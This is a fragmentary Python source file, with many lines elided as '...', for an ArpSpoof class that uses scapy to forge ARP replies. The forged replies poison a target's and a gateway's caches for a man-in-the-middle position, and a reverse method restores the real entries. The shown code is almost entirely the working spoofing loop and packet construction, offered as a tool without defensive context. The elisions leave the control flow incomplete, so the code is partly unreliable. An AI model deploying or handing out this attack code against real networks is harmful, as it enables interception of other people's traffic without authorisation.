...
class ArpSpoof:
    ...
    def __init__(self, target_ip, gateway_ip):
        ...
        self.__gateway_mac = self.discover_mac(self.__gateway_ip)
    ...
    def spoof(self):
        ...
        if self.__attacker_mac is None:
        ...
        elif self.__gateway_mac is None:
            ...
            while self.__state_spoof:
                ...
                pkt_arp_spoof_target = Ether(src=self.__gateway_mac, dst=self.__target_mac) / \
                                       ARP(op=2, hwsrc=self.__attacker_mac, psrc=self.__gateway_ip,
                                           hwdst=self.__target_mac, pdst=self.__target_ip)

                pkt_arp_spoof_gateway = Ether(src=self.__target_mac, dst=self.__gateway_mac) / \
                                        ARP(op=2, hwsrc=self.__attacker_mac, psrc=self.__target_ip,
                                            hwdst=self.__gateway_mac, pdst=self.__gateway_ip)

                # Precompile the packages to send to the targets
                sendp(pkt_arp_spoof_target, verbose=False)
                sendp(pkt_arp_spoof_gateway, verbose=False)

                time.sleep(1)

                yield self.__attacker_mac + " is at " + self.__target_ip + " " + self.__gateway_ip
    ...
    def reverse_spoof(self):
        ...
        pkt_arp_spoof_reverse_target = Ether(src=self.__gateway_mac, dst=self.__target_mac) / \
                                       ARP(op=2, hwsrc=self.__gateway_mac, psrc=self.__gateway_ip,
                                           hwdst=self.__target_mac, pdst=self.__target_ip)

        pkt_arp_spoof_reverse_host = Ether(src=self.__target_mac, dst=self.__gateway_mac) / \
        ...
        for x in range(0, 5):
            ...
            yield self.__attacker_mac + " is at " + self.__gateway_mac + " " + self.__target_ip + " " + \
                  self.__target_mac + " " + self.__gateway_ip
